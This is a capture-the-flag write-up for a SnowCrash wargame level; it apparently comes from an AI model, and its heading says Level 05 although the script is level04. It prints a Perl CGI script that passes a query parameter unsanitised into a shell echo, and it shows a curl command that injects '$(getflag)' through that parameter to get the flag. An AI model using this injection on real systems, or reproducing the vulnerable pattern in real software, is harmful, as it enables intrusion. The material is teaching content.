Here's the revised homework for Level 05, incorporating the additional `netstat` command output, presented in a clear, neutral tone, and structured in Markdown format:

---

# Level 05

## Analysis

In the user's home directory, we found a Perl script named `level04.pl`. The script's content is as follows:

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

Additionally, we executed the `netstat -plunt` command to inspect active Internet connections and the services listening on various ports:

```sh
level04@SnowCrash:~$ netstat -plunt
(No info could be read for "-p": geteuid()=2004 but you should be root.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:4242            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::4646                 :::*                    LISTEN      -
tcp6       0      0 :::4747                 :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::4242                 :::*                    LISTEN      -
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```

This output, combined with the script's functionality, confirmed that an HTTP server was hosted and listening on port 4747. The script processes a parameter named "x" and passes it to the `echo` command, offering a potential vector for command injection.

To exploit this vulnerability, we performed command injection using the query parameter "x" to inject a command within the `echo` statement as follows:

```sh
curl 'http://localhost:4747/?x=$(getflag)'
```

This operation successfully executed the injected command, leading to the acquisition of the flag.